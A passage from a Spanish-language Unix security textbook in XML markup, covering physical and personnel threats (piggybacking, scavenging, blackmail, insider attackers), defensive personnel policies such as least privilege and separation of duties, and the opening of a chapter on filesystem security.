simplemente se le deja seguir, ah&#x02CA;&#x0131; ya entrar&#x02CA;&#x0131;a en juego la formaci&#x00F3;n de los usuarios) por tratarse de &#x00E1;reas
dentro de las cuales todo el personal &#x2018;habitual&#x2019; se conoce. El masquerading es m&#x00E1;s habitual
en entornos donde existen controles de acceso f&#x02CA;&#x0131;sico, y donde un intruso puede &#x2018;enga~nar&#x2019; al
dispositivo &#x2013; o persona &#x2013; que realiza el control, por ejemplo con una tarjeta de identi&#xFB01;caci&#x00F3;n
robada que un lector acepta o con un carn&#x00E9; falsi&#xFB01;cado que un guardia de seguridad da por
bueno.
<!--br/-->
<!--br/-->Una variante del masquerading lo constituye el ataque denominado piggybacking, que consiste
simplemente en seguir a un usuario autorizado hasta un &#x00E1;rea restringida y acceder a la misma
gracias a la autorizaci&#x00F3;n otorgada a dicho usuario. Contra esto se deben aplicar las mismas
medidas que contra la mascarada f&#x02CA;&#x0131;sica: controles de acceso estrictos, y convenientemente

veri&#xFB01;cados. Los ejemplos de piggybacking son muy habituales: desde un atacante que se viste con un
mono de trabajo y que carga con un pesado equipo inform&#x00E1;tico en la puerta de una sala de
operaciones, para que justo cuando un usuario autorizado llegue le abra dicha puerta y le
permita el acceso por delante del guardia de seguridad, hasta la cl&#x00E1;sica an&#x00E9;cdota que todos
los auditores explican como suya, sobre el reconocedor de tarjetas inteligentes que abre la
puerta de una sala pero que una vez abierta no se preocupa en contar cuantas personas la
atraviesan, podr&#x02CA;&#x0131;amos estar durante d&#x02CA;&#x0131;as dando ejemplos de ataques exitosos utilizando la t&#x00E9;cnica del
piggybacking.
  </para></section><!--end subsection--><!--l. 180--><section 
role="subsection"><title><abbrev role="title-mark">3.2.4</abbrev><anchor 
   id="x1-470003.2.4"  ></anchor>Basureo</title>
<!--l. 181--><para>  La t&#x00E9;cnica del basureo (en ingl&#x00E9;s, scavenging) est&#x00E1; relacionada tanto con los usuarios como con la seguridad
f&#x02CA;&#x0131;sica de los sistemas, de la que hemos hablado en el anterior cap&#x02CA;&#x0131;tulo; consiste en obtener informaci&#x00F3;n
dejada en o alrededor de un sistema inform&#x00E1;tico tras la ejecuci&#x00F3;n de un trabajo (<citation>[?]</citation>). El basureo puede ser
f&#x02CA;&#x0131;sico, como buscar en cubos de basura (trashing, traducido tambi&#x00E9;n por basureo) listados de
impresi&#x00F3;n o copias de documentos, o l&#x00F3;gico, como analizar bu&#xFB00;ers de impresoras, memoria liberada
por procesos, o bloques de un disco que el sistema acaba de marcar como libres, en busca de
informaci&#x00F3;n.
<!--br/-->
<!--br/-->Aunque esta t&#x00E9;cnica no es muy utilizada en la mayor&#x02CA;&#x0131;a de entornos, hemos de pensar que si un usuario tira
a la basura documentos que proporcionen informaci&#x00F3;n sobre nuestro sistema, cualquier potencial atacante
puede aprovechar esa informaci&#x00F3;n para conseguir acceder al equipo; algo tan simple como una factura
en la que se especi&#xFB01;quen n&#x00FA;meros de tel&#x00E9;fono o nombres (reales o de entrada al sistema) de
usuarios puede convertirse en una valiosa informaci&#x00F3;n para un atacante. Adem&#x00E1;s, en ocasiones
ni siquiera es necesario andar revolviendo por los cubos de basura en busca de informaci&#x00F3;n
comprometedora: la carencia de nociones b&#x00E1;sicas sobre seguridad inform&#x00E1;tica hace posible que los
usuarios dejen al alcance de cualquiera informaci&#x00F3;n vital de cara a mantener un sistema seguro.
Personalmente, en un aula de inform&#x00E1;tica de la Universidad Polit&#x00E9;cnica de Valencia encontr&#x00E9;
por casualidad una hoja de papel que estaba siendo utilizada a modo de alfombrilla para el
rat&#x00F3;n; esta hoja era una carta personalizada que el director de la Escuela T&#x00E9;cnica Superior de
Ingenieros Industriales hab&#x02CA;&#x0131;a enviado a cada alumno de esa escuela para informarles de sus nuevas
claves de acceso a ciertos recursos de la universidad, ya que las anteriores hab&#x02CA;&#x0131;an tenido que
ser cambiadas porque un pirata las captur&#x00F3;. Con esa sencilla hoja de papel (en la &#xFB01;gura  <ulink 
  url="#x1-470011"  ><!--ref: scav--></ulink> se
muestra una copia &#x2013; con los datos importantes ocultos, en el original no hay nada &#x2018;censurado&#x2019; &#x2013;)
cualquiera podr&#x02CA;&#x0131;a haber le&#x02CA;&#x0131;do el correo de ese usuario, utilizar su acceso remoto de la universidad,
curiosear en su expediente o participar en foros de asignaturas bajo la identidad del usuario
atacado.
<!--br/--></para><figure><title/><blockquote>


<section role="center"><title/>
<!--l. 217--><para>
heightwidthdepthscav.png                                                            <graphic width="430.0pt" fileref="scav.png" ></graphic>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-470011"  ></anchor>Figura&#x00A0;3.1</title><para>El resultado de un basureo involuntario.</para></blockquote>
</para></section>

  </blockquote></figure>
<!--br/-->Como hemos dicho el basureo no es un ataque habitual en organizaciones &#x2018;normales&#x2019;, simplemente porque
los datos con los que estan trabajan no suelen ser de alta con&#xFB01;dencialidad. De cualquier forma, si
deseamos evitar problemas lo m&#x00E1;s inmediato es utilizar una m&#x00E1;quina trituradora de papel (su precio no suele
ser prohibitivo, y la inversi&#x00F3;n quiz&#x00E1;s valga la pena) para destruir toda la documentaci&#x00F3;n antes de
arrojarla a la basura; incluso nos puede interesar contratar los servicios de compa~n&#x02CA;&#x0131;as dedicadas
exclusivamente a la destrucci&#x00F3;n de estos soportes. En el caso de sistemas de almacenamiento l&#x00F3;gico
(discos, CD-ROMs, cintas&#x2026;) tambi&#x00E9;n es importante una correcta inutilizaci&#x00F3;n de los mismos
para que un potencial atacante no pueda extraer informaci&#x00F3;n comprometedora; no suele ser
su&#xFB01;ciente el simple borrado del medio o un leve da~no f&#x02CA;&#x0131;sico (por ejemplo, partir un CD-ROM),
ya que como comentaremos al hablar de recuperaci&#x00F3;n de datos existen empresas capaces de
extraer hasta el &#x00FA;ltimo bit de un medio borrado o da~nado. Lo m&#x00E1;s efectivo ser&#x02CA;&#x0131;a un borrado
seguro, seguido de una destrucci&#x00F3;n f&#x02CA;&#x0131;sica importante que haga imposible la reconstrucci&#x00F3;n del
medio.
  </section><!--end subsection--><!--l. 241--><section 
role="subsection"><title><abbrev role="title-mark">3.2.5</abbrev><anchor 
   id="x1-480003.2.5"  ></anchor>Actos delictivos</title>
<!--l. 242--><para>  Bajo este nombre englobamos actos tipi&#xFB01;cados claramente como delitos por las leyes espa~nolas, como el
chantaje, el soborno o la amenaza. Esto no implica que el resto de actividades no sean (o deban ser)
delitos, sino simplemente que en la pr&#x00E1;ctica a nadie se le castiga &#x2018;legalmente&#x2019; por pasear por una sala de
operaciones en busca de claves apuntadas en teclados, pero s&#x02CA;&#x0131; que se le puede castigar por amenazar a un
operador para que le permita el acceso al sistema.
<!--br/-->
<!--br/-->Por suerte, la naturaleza de la informaci&#x00F3;n con la que se trabaja en la mayor parte de entornos hace poco
probable que alguien amenaze o chantajee a un operador para conseguir ciertos datos; al tratarse de
informaci&#x00F3;n poco sensible, en la mayor&#x02CA;&#x0131;a de situaciones los atacantes no llegan a estos extremos para
acceder al sistema, sino que utilizan procedimientos menos arriesgados como la ingenier&#x02CA;&#x0131;a social o la
captura de datos que viajan por la red. No obstante, si en alguna ocasi&#x00F3;n nos encontramos en estas
situaciones, siempre es conveniente la denuncia; aunque en principio podamos ceder ante las presiones de
un delincuente, hemos de tener presente que si mostramos cierta debilidad, una vez que &#x00E9;ste consiga sus
prop&#x00F3;sitos nada le va a impedir seguir amenaz&#x00E1;ndonos o chantaje&#x00E1;ndonos para obtener m&#x00E1;s informaci&#x00F3;n. Si
actuamos con la su&#xFB01;ciente discrecci&#x00F3;n, las autoridades pueden f&#x00E1;cilmente llevar al individuo ante la justicia
sin necesidad de grandes esc&#x00E1;ndalos que pueden afectar gravemente a la imagen de nuestra
organizaci&#x00F3;n.
  </para></section><!--end subsection--></section><!--end section--><!--l. 264--><section 
role="section"><title><abbrev role="title-mark">3.3</abbrev><anchor 
   id="x1-490003.3"  ></anchor>&#x00BF;Qu&#x00E9; hacer ante estos problemas?</title>
<!--l. 265--><para>  La soluci&#x00F3;n a problemas relacionados con el personal es con frecuencia mucho m&#x00E1;s compleja que la de
problemas de seguridad l&#x00F3;gica o seguridad de la red: mientras que un administrador puede aprovechar
herramientas de seguridad, capacidades del sistema operativo, o cifrado de datos para prevenir ciertos
ataques, es mucho m&#x00E1;s dif&#x02CA;&#x0131;cil para &#x00E9;l concienciar a los usuarios de unas m&#x02CA;&#x0131;nimas medidas de prevenci&#x00F3;n o
convencer a un guardia de seguridad de que s&#x00F3;lo deje acceder a la sala de operaciones a un n&#x00FA;mero
restringido de personas.
<!--br/-->
<!--br/-->Generalmente los usuarios de m&#x00E1;quinas Unix en entornos habituales son personas muy poco formadas en el
manejo del sistema operativo, y mucho menos en lo que a seguridad inform&#x00E1;tica se re&#xFB01;ere; se suele tratar de
usuarios que s&#x00F3;lo utilizan la m&#x00E1;quina para ejecutar aplicaciones muy concretas (simulaciones,
compiladores, gesti&#x00F3;n del correo electr&#x00F3;nico, aplicaciones cient&#x02CA;&#x0131;&#xFB01;cas&#x2026;relacionadas con su &#x00E1;rea de trabajo),
y cuya &#x00FA;nica preocupaci&#x00F3;n es que sus datos est&#x00E9;n listos cuando los requieren, de la forma m&#x00E1;s
f&#x00E1;cil y r&#x00E1;pida posible. Incluso el administrador de ciertos sistemas es uno de estos usuarios,
elegido dentro del grupo (o mucho peor, son todos los usuarios). Evidentemente, resulta muy
dif&#x02CA;&#x0131;cil concienciar a estas personas de la necesidad de seguridad en el entorno; posturas como
&#x2018;no importa que mi clave sea d&#x00E9;bil, s&#x00F3;lo utilizo la cuenta para imprimir con la l&#x00E1;ser&#x2019; son por
desgracia demasiado frecuentes. El responsable de seguridad ha de concienciar a todas estas
personas de la necesidad de la seguridad para que el entorno de trabajo funcione como se espera
de &#x00E9;l; la seguridad inform&#x00E1;tica se ha de ver como una cadena que se rompe si falla uno de sus

eslabones: no importa que tengamos un sistema de cifrado resistente a cualquier ataque o
una autenticaci&#x00F3;n fuerte de cualquier entidad del sistema si un intruso es capaz de obtener un
nombre de usuario con su correspondiente contrase~na simplemente llamando por tel&#x00E9;fono a una
secretaria.
<!--br/-->
<!--br/-->Adem&#x00E1;s de concienciaci&#x00F3;n de los usuarios y administradores en cuanto a seguridad se re&#xFB01;ere (esto ser&#x02CA;&#x0131;a el
QU&#x00E9;), para conseguir un sistema &#xFB01;able es necesaria la formaci&#x00F3;n de los mismos (el C&#x00F3;MO). De la misma
forma que a nadie se le ocurre conducir sin tener unos conocimientos b&#x00E1;sicos sobre un autom&#x00F3;vil, no deber&#x02CA;&#x0131;a
ser tan habitual que la gente utilice o administre Unix sin unos conocimientos previos del sistema
operativo. Evidentemente, a un qu&#x02CA;&#x0131;mico que utiliza el sistema para simular el comportamiento de
determinada sustancia bajo ciertas condiciones no se le puede exigir un curso intensivo o unos
grandes conocimientos de mecanismos de seguridad en Unix; pero s&#x02CA;&#x0131; que ser&#x02CA;&#x0131;a recomendable que
conozca unas ideas b&#x00E1;sicas (volviendo al ejemplo del autom&#x00F3;vil, para conducir un coche a nadie
se le exige ser un as de la mec&#x00E1;nica, pero s&#x02CA;&#x0131; unas cualidades m&#x02CA;&#x0131;nimas). Estas ideas b&#x00E1;sicas se
pueden incluso resumir en una hoja que se le entregue a cada usuario al darlos de alta en
el sistema. Si pasamos a hablar de administradores, s&#x02CA;&#x0131; que ser&#x02CA;&#x0131;a recomendable exigirles un
cierto nivel de conocimientos de seguridad, nivel que se puede adquirir simplemente leyendo
alg&#x00FA;n libro (especialmente recomendado ser&#x02CA;&#x0131;a <citation>[?]</citation> o, para los que dispongan de menos tiempo,
<citation>[?]</citation>).
<!--br/-->
<!--br/-->Un grupo de personas m&#x00E1;s delicado si cabe es el conjunto formado por todos aquellos que no son usuarios
del sistema pero que en cierta forma pueden llegar a comprometerlo. Por ejemplo, en este conjunto
encontramos elementos tan diversos como guardias de seguridad que controlen el acceso a las instalaciones
inform&#x00E1;ticas o personal de administraci&#x00F3;n y servicios que no utilicen el sistema pero que tengan acceso f&#x02CA;&#x0131;sico
a &#x00E9;l, como electricistas, bedeles o personal de limpieza. Sin entrar en temas que seguramente no
son aplicables a los sistemas habituales, como el espionaje industrial o el terrorismo de alta
magnitud <anchor 
   id="x1-49001f2"  ></anchor><footnote><para>     Temas que habr&#x02CA;&#x0131;a que tener en cuenta en otro tipo de redes.</para></footnote>,
simplemente hemos de concienciar y ense~nar a estos &#x2018;usuarios&#x2019; unas medidas b&#x00E1;sicas a tomar para no poner
en peligro nuestra seguridad; estas medidas dependen por supuesto de la funci&#x00F3;n de cada unas personas
realice.
<!--br/-->
<!--br/-->Pero, &#x00BF;qu&#x00E9; sucede cuando el personal de nuestra propia organizaci&#x00F3;n produce ataques (y no accidentes) sobre
nuestros sistemas? En este caso las consecuencias pueden ser grav&#x02CA;&#x0131;simas, y por tanto las medidad de
protecci&#x00F3;n y detecci&#x00F3;n han de ser estrictas. Se ha de llevar a cabo un control estricto de las actividades que
se realizan en la organizaci&#x00F3;n, por ejemplo mediante pol&#x02CA;&#x0131;ticas que han de ser de obligado cumplimiento,
as&#x02CA;&#x0131; como un control de acceso a todos los recursos de los que disponemos (mediante mecanismos de
autenticaci&#x00F3;n de usuarios, alarmas, etc.). Adem&#x00E1;s, las sanciones en caso de incumplimiento de las normas
han de ser efectivas y ejemplares: si un usuario viola intencionadamente nuestra seguridad y no se
le sanciona adecuadamente, estamos invitando al resto de usuarios a que hagan lo mismo.
En el punto siguiente vamos a hablar con m&#x00E1;s profundidad de estos atacantes, denominados
internos.
  </para></section><!--end section--><!--l. 340--><section 
role="section"><title><abbrev role="title-mark">3.4</abbrev><anchor 
   id="x1-500003.4"  ></anchor>El atacante interno</title>
<!--l. 341--><para>  En el punto anterior hemos presentado al personal de nuestra organizaci&#x00F3;n como v&#x02CA;&#x0131;ctima de los ataques
realizados por agentes externos a la misma; sin embargo, seg&#x00FA;n <citation>[?]</citation> el 80 % de los fraudes, robos, sabotajes o
accidentes relacionados con los sistemas inform&#x00E1;ticos son causados por el propio personal de la organizaci&#x00F3;n
propietaria de dichos sistemas, lo que se suele denominar el insider factor. &#x00BF;Qu&#x00E9; signi&#xFB01;ca esto?
Principalmente que la mayor amenaza a nuestros equipos viene de parte de personas que han trabajado o
trabajan con los mismos. Esto, que es realmente preocupante, lo es mucho m&#x00E1;s si analizamos la
situaci&#x00F3;n con un m&#x02CA;&#x0131;nimo de detalle: una persona que trabaje codo a codo con el administrador, el
programador, o el responsable de seguridad de una m&#x00E1;quina conoce perfectamente el sistema, sus
barreras, sus puntos d&#x00E9;biles&#x2026;de forma que un ataque realizado por esa persona va a ser much&#x02CA;&#x0131;simo
m&#x00E1;s directo, dif&#x02CA;&#x0131;cil de detectar, y sobre todo, efectivo, que el que un atacante externo (que
necesita recopilar informaci&#x00F3;n, intentar probar fallos de seguridad o conseguir privilegios) pueda
ejecutar.

<!--br/-->
<!--br/-->Pero, &#x00BF;por qu&#x00E9; va a querer alguien atacar a su propia organizaci&#x00F3;n? &#x00BF;Por qu&#x00E9; alguien va a arriesgarse a perder
su trabajo, romper su carrera o incluso a ir a la c&#x00E1;rcel? Como se acostumbra a decir, todos tenemos un
precio; no importa lo honestos que seamos o que queramos creer que somos: dinero, chantaje, factores
psicol&#x00F3;gicos&#x2026;nos pueden arrastrar a vender informaci&#x00F3;n, a robar &#xFB01;cheros o simplemente a proporcionar
acceso a terceros que se encarguen del trabajo sucio. En una empresa, un empleado puede considerarse
mal pagado e intentar conseguir un sueldo extra a base de vender informaci&#x00F3;n; en un banco, alguien que a
diario trabaje con los sistemas inform&#x00E1;ticos puede darse cuenta de la facilidad para desviar fondos a una
cuenta sin levantar sospechas; en una base militar, un pa&#x02CA;&#x0131;s enemigo puede secuestrar a la
mujer de un administrador para que &#x00E9;ste les pase informaci&#x00F3;n con&#xFB01;dencial. Existen numerosos
estudios (<citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>&#x2026;) que tratan de explicar los motivos que llevan a una persona a
cometer delitos, inform&#x00E1;ticos o no, contra su propia organizaci&#x00F3;n, pero sea cual sea el motivo la
cuesti&#x00F3;n est&#x00E1; en que tales ataques existen, son numerosos, y hay que tomar medidas contra
ellos.
<!--br/-->
<!--br/-->&#x00BF;C&#x00F3;mo prevenir o defendernos de los atacantes internos? En una empresa, una norma b&#x00E1;sica ser&#x02CA;&#x0131;a veri&#xFB01;car el
curriculum de cualquier aspirante a nuevo miembro (no simplemente leerlo y darlo por bueno, sino
comprobar los datos y directamente descartar al aspirante si se detecta una mentira); si buscamos algo
m&#x00E1;s de seguridad &#x2013; por ejemplo, sistemas militares &#x2013; tambi&#x00E9;n es recomendable investigar el
pasado de cada aspirante a pertenecer a la organizaci&#x00F3;n, buscando sobre todo espacios en blanco
durante los que no se sabe muy bien qu&#x00E9; ha hecho o a qu&#x00E9; se ha dedicado esa persona (&#x00BF;qui&#x00E9;n
nos asegura que ese par&#x00E9;ntesis de tres a~nos durante los que el aspirante asegura que estuvo
trabajando para una empresa extranjera no los pas&#x00F3; realmente en la carcel por delitos inform&#x00E1;ticos?).
Si siguiendo ejemplos como estos podemos asegurar la integridad de todos los que entran
a formar parte del equipo, habremos dado un importante paso en la prevenci&#x00F3;n de ataques
internos.
<!--br/-->
<!--br/-->Tampoco debemos olvidar que el hecho de que alguien entre &#x2018;limpio&#x2019; a nuestra organizaci&#x00F3;n no implica
que vaya a seguir as&#x02CA;&#x0131; durante el tiempo que trabaje para nosotros, y mucho menos cuando
abandone su trabajo. Para minimizar el da~no que un atacante interno nos puede causar se
suelen seguir unos principios fundamentales (<citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>&#x2026;) que se aplican sobre el personal de la
empresa:
     </para><itemizedlist>
     <listitem>
     <!--l. 397--><para>Necesidad de saber (Need to know) o m&#x02CA;&#x0131;nimo privilegio
     <!--br/-->A  cada  usuario  se  le  debe  otorgar  el  m&#x02CA;&#x0131;nimo  privilegio  que  necesite  para  desepe~nar
     correctamente su funci&#x00F3;n, es decir, se le debe permitir que sepa s&#x00F3;lamente lo que necesita para
     trabajar. De esta forma, un programador no tiene por qu&#x00E9; conocer las pol&#x02CA;&#x0131;ticas de copia de
     seguridad de la m&#x00E1;quina, ni un alumno tiene que poseer privilegios en un sistema de pr&#x00E1;cticas.
     </para></listitem>
     <listitem>
     <!--l. 404--><para>Conocimiento parcial (Dual Control)
     <!--br/-->Las actividades m&#x00E1;s delicadas dentro de la organizaci&#x00F3;n en cuanto a seguridad se re&#xFB01;ere (por
     ejemplo, el conocimiento de la clave de root de una m&#x00E1;quina) deben ser realizadas por dos
     personas competentes, de forma que si uno de ellos comete un error o intenta violar las pol&#x02CA;&#x0131;ticas
     de seguridad el otro pueda darse cuenta r&#x00E1;pidamente y subsanarlo o evitarlo. De la misma
     forma, aplicar este principio asegura que si uno de los responsables abandona la organizaci&#x00F3;n
     o tiene un accidente el otro pueda seguir operando los sistemas mientras una nueva persona
     sustituye a su compa~nero.
     </para></listitem>
     <listitem>
     <!--l. 413--><para>Rotaci&#x00F3;n de funciones
     <!--br/-->Quiz&#x00E1;s la mayor amenaza al conocimiento parcial es la potencial complicidad que los dos
     responsables de cierta tarea puedan llegar a establecer, de forma que entre los dos sean

     capaces de ocultar las violaciones de seguridad que nuestros sistemas puedan sufrir; incluso
     puede suceder lo contrario: que ambas personas sean enemigos y esto repercuta en el buen
     funcionamiento de la pol&#x02CA;&#x0131;tica de seguridad establecida. Para evitar ambos problemas, una
     norma com&#x00FA;n es rotar &#x2013; siempre dentro de unos l&#x02CA;&#x0131;mites &#x2013; a las personas a lo largo de diferentes
     responsabilidades, de forma que a la larga todos puedan vigilar a todos; esto tambi&#x00E9;n es muy
     &#x00FA;til en caso de que alguno de los responsables abandone la organizaci&#x00F3;n, ya que en este caso sus
     tareas ser&#x00E1;n cubiertas m&#x00E1;s r&#x00E1;pidamente.
     </para></listitem>
     <listitem>
     <!--l. 425--><para>Separaci&#x00F3;n de funciones
     <!--br/-->No es en absoluto recomendable que una sola persona (o dos, si establecemos un control dual)
     posea o posean demasiada informaci&#x00F3;n sobre la seguridad de la organizaci&#x00F3;n; es necesario que
     se de&#xFB01;nan y separen correctamente las funciones de cada persona, de forma que alguien cuya
     tarea es velar por la seguridad de un sistema no posea &#x00E9;l mismo la capacidad para violar dicha
     seguridad sin que nadie se percate de ello.</para></listitem></itemizedlist>
<!--l. 433--><para>Si aplicamos correctamente los principios anteriores en nuestra pol&#x02CA;&#x0131;tica de personal vamos a evitar muchos
problemas de seguridad, no s&#x00F3;lo cuando un usuario trabaja para nuestro entorno sino lo que es igual de
importante, cuando abandona la organizaci&#x00F3;n. Cuando esto sucede se debe cancelar inmediatamente el
acceso de esa persona a todos nuestros recursos (cuentas de usuario, servicio de acceso remoto, unidades
de red&#x2026;), y tambi&#x00E9;n cambiar las claves que ese usuario conoc&#x02CA;&#x0131;a. Especialmente en los entornos de I+D quiz&#x00E1;s
esto es algo complicado debido a la gran movilidad de usuarios (un profesor invitado durante un mes a la
universidad, un proyectando que s&#x00F3;lo necesita acceso a una m&#x00E1;quina mientras que realiza su proyecto&#x2026;),
por lo que es aqu&#x02CA;&#x0131; donde se suelen ver mayores barbaridades en los sistemas: desde cuentas
que hace a~nos que no se utilizan hasta direcciones de correo de gente que dej&#x00F3; de trabajar
para la organizaci&#x00F3;n hace a~nos. Evidentemente, este tipo de cosas son muy preocupantes para
la seguridad, y es justo en estos accesos no utilizados donde un atacante puede encontrar
una de las mejores puertas de entrada a los sistemas: simplemente hemos de pensar que si el
usuario de una cuenta hace a~nos que no la utiliza, por l&#x00F3;gica hace a~nos que esa clave no se
cambia.
<!--br/-->
<!--br/-->Hasta ahora hemos hablado principalmente de los problemas que nos pueden causar las personas que
trabajan para la organizaci&#x00F3;n; no obstante, las redes de I+D son bastante peculiares a la hora de hablar de
ataques internos. Se trata de sistemas en los que un elevado n&#x00FA;mero de usuarios &#x2013; los alumnos &#x2013; puede
considerar un reto personal o intelectual (?) saltarse las medidas de protecci&#x00F3;n impuestas en la red; adem&#x00E1;s,
y especialmente en universidades t&#x00E9;cnicas, por la naturaleza de sus estudios muchos alumnos
llegan a poseer elevados conocimientos sobre sistemas operativos y redes, lo que evidentemente
es un riesgo a~nadido: no es lo mismo proteger de ataques internos una m&#x00E1;quina Unix en una
Facultad de Derecho, donde a priori muy pocos alumnos tendr&#x00E1;n el inter&#x00E9;s o los conocimientos
su&#xFB01;cientes para saltarse la seguridad del sistema, que en una Facultad de Inform&#x00E1;tica, donde el
que m&#x00E1;s y el que menos tiene nociones de seguridad o de Unix y a diario se trabaja en estos
entornos.
<!--br/-->
<!--br/-->Las normas vistas aqu&#x02CA;&#x0131; seguramente se pueden aplicar sobre el personal de la organizaci&#x00F3;n, pero no sobre
los alumnos (que es justamente de quienes provienen la mayor&#x02CA;&#x0131;a de ataques): no podemos obligar a un
alumno de nuevo ingreso a que nos muestre un resumen de su vida, ni mucho menos tenemos
capacidad para veri&#xFB01;car los datos de treinta o cincuenta mil alumnos. Incluso si pudi&#x00E9;ramos,
&#x00BF;ser&#x02CA;&#x0131;a legal o &#x00E9;tico denegar el acceso a la universidad a alguien con antecedentes penales, por
ejemplo? Seguramente no&#x2026;De esta forma, en organismos de I+D nos debemos ce~nir a otros
mecanismos de prevenci&#x00F3;n, por ejemplo en forma de sanciones ejemplares para todos aquellos que
utilicen los recursos del centro para cometer delitos inform&#x00E1;ticos; sin llegar a los tribunales, las
posibles penas impuestas dentro de la universidad son a veces m&#x00E1;s efectivas que una denuncia
en el juzgado, donde los piratas incluso despiertan cierta simpat&#x02CA;&#x0131;a entre muchos abogados y
jueces.


</para><!--l. 1--><para>

</para><!--l. 1--><para>

</para><!--l. 1--><para>

  </para></section><!--end section--><!--l. 1--><section 
role="part"><title><anchor 
   id="x1-51000II"  ></anchor>Seguridad del sistema</title>

<!--l. 72--><para>


</para><!--l. 1--><para>

  </para></section><!--end part--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-520004"  ></anchor>El sistema de &#xFB01;cheros</title>
<section role="center"><title/>
<!--l. 2--><para> NOTA:  Obviamente,  en  este  cap&#x02CA;&#x0131;tulo  no  hablaremos  del  tratamiento  de  &#xFB01;cheros
 (creaci&#x00F3;n, borrado, modi&#xFB01;caci&#x00F3;n, jerarqu&#x02CA;&#x0131;a de directorios&#x2026;), sino de temas referentes a
 la seguridad de los archivos y el sistema de &#xFB01;cheros. Para informaci&#x00F3;n sobre la gesti&#x00F3;n
 de &#xFB01;cheros se puede consultar cualquier obra que estudie Unix desde una perspectiva
 general, como <citation>[?]</citation>, <citation>[?]</citation> o <citation>[?]</citation>. Para un conocimiento m&#x00E1;s profundo sobre los &#xFB01;cheros y los
 sistemas de archivos se puede consultar <citation>[?]</citation>, <citation>[?]</citation> (BSD), <citation>[?]</citation> (System V) o, en el caso de
 Linux, <citation>[?]</citation> o <citation>[?]</citation>.                                                           </para></section>
  <!--l. 17--><section 
role="section"><title><abbrev role="title-mark">4.1</abbrev><anchor 
   id="x1-530004.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 18--><para>  Dentro del sistema Unix todo son archivos: desde la memoria f&#x02CA;&#x0131;sica del equipo hasta el rat&#x00F3;n,
pasando por m&#x00F3;dems, teclado, impresoras o terminales. Esta &#xFB01;losof&#x02CA;&#x0131;a de dise~no es uno de los
factores que m&#x00E1;s &#x00E9;xito y potencia proporciona a Unix (<citation>[?]</citation>), pero tambi&#x00E9;n uno de los que m&#x00E1;s
peligros entra~na: un simple error en un permiso puede permitir a un usuario modi&#xFB01;car todo un
disco duro o leer los datos tecleados desde una terminal. Por esto, una correcta utilizaci&#x00F3;n de
los permisos, atributos y otros controles sobre los &#xFB01;cheros es vital para la seguridad de un
sistema.
<!--br/-->
<!--br/-->En un sistema Unix t&#x02CA;&#x0131;pico existen tres tipos b&#x00E1;sicos de archivos: &#xFB01;cheros planos, directorios, y &#xFB01;cheros especiales
(dispositivos)  <anchor 
   id="x1-53001f1"  ></anchor><footnote><para>     Otros tipos de archivos, como los enlaces simb&#x00F3;licos, los sockets o los pipes no los vamos a tratar aqu&#x02CA;&#x0131;.</para></footnote>;
generalmente, al hablar de &#xFB01;cheros nos solemos referir a todos ellos si no se especi&#xFB01;ca lo contrario.
Los &#xFB01;cheros planos son secuencias de bytes que a priori no poseen ni estructura interna ni
contenido signi&#xFB01;cante para el sistema: su signi&#xFB01;cado depende de las aplicaciones que interpretan
su contenido. Los directorios son archivos cuyo contenido son otros &#xFB01;cheros de cualquier
tipo (planos, m&#x00E1;s directorios, o &#xFB01;cheros especiales), y los &#xFB01;cheros especiales son &#xFB01;cheros que
representan dispositivos del sistema; este &#x00FA;ltimo tipo se divide en dos grupos: los dispositivos
orientados a car&#x00E1;cter y los orientados a bloque. La principal diferencia entre ambos es la forma de
realizar operaciones de entrada/salida: mientras que los dispositivos orientados a car&#x00E1;cter las
realizan byte a byte (esto es, car&#x00E1;cter a car&#x00E1;cter), los orientados a bloque las realizan en bloques de
caracteres.
<!--br/-->
<!--br/-->El sistema de &#xFB01;cheros es la parte del n&#x00FA;cleo m&#x00E1;s visible por los usuarios; se encarga de abstraer
propiedades f&#x02CA;&#x0131;sicas de diferentes dispositivos para proporcionar una interfaz &#x00FA;nica de almacenamiento: el
archivo. Cada sistema Unix tiene su sistema de archivos nativo (por ejemplo, ext2 en Linux, UFS en Solaris
o EFS en IRIX), por lo que para acceder a todos ellos de la misma forma el n&#x00FA;cleo de Unix incorpora una
capa superior denominada VFS (Virtual File System) encargada de proporcionar un acceso uniforme a
diferentes tipos de sistema de &#xFB01;cheros.
<!--br/-->
<!--br/-->Un inodo o nodo &#x02CA;&#x0131;ndice es una estructura de datos que relaciona un grupo de bloques de un dispositivo
con un determinado nombre del sistema de &#xFB01;cheros. Internamente, el n&#x00FA;cleo de Unix no distingue a sus
archivos por su nombre sino por un n&#x00FA;mero de inodo; de esta forma, el &#xFB01;chero con n&#x00FA;mero de inodo 23421
ser&#x00E1; el mismo tanto si se denomina /etc/passwd como si se denomina /usr/fichero. Mediante la orden
ln(1) se pueden asignar a un mismo inodo varios nombres de &#xFB01;chero diferentes en el sistema de
archivos.
  </para></section><!--end section--><!--l. 59--><section 
role="section"><title><abbrev role="title-mark">4.2</abbrev><anchor 
   id="x1-540004.2"  ></anchor>Sistemas de &#xFB01;cheros</title>
<!--l. 60--><para>  Cuando un sistema Unix arranca una de las tareas que obligatoriamente ha de realizar es incorporar
diferentes sistemas de &#xFB01;cheros &#x2013; discos completos, una partici&#x00F3;n, una unidad de CD-ROM&#x2026;&#x2013; a la jerarqu&#x02CA;&#x0131;a
de directorios Unix; este proceso se llama montaje, y para realizarlo generalmente se utiliza la orden
mount. Es obligatorio montar al menos un sistema de &#xFB01;cheros durante el arranque, el sistema ra&#x02CA;&#x0131;z (&#x2018;/&#x2019;),
del que colgar&#x00E1;n todos los dem&#x00E1;s.
<!--br/-->
<!--br/-->Montar un sistema de &#xFB01;cheros no signi&#xFB01;ca m&#x00E1;s que asociar un determinado nombre de directorio,

denominado mount point o punto de montaje, con el sistema en cuesti&#x00F3;n, de forma que al utilizar dicha ruta
estaremos trabajando sobre el sistema de &#xFB01;cheros que hemos asociado a ella. Para saber qu&#x00E9; sistemas de
&#xFB01;cheros se han de montar en el arranque de la m&#x00E1;quina, y bajo qu&#x00E9; nombre de directorio, Unix utiliza un
determinado archivo; aunque su nombre depende del clon utilizado (/etc/vfstab en Solaris, /etc/fstab
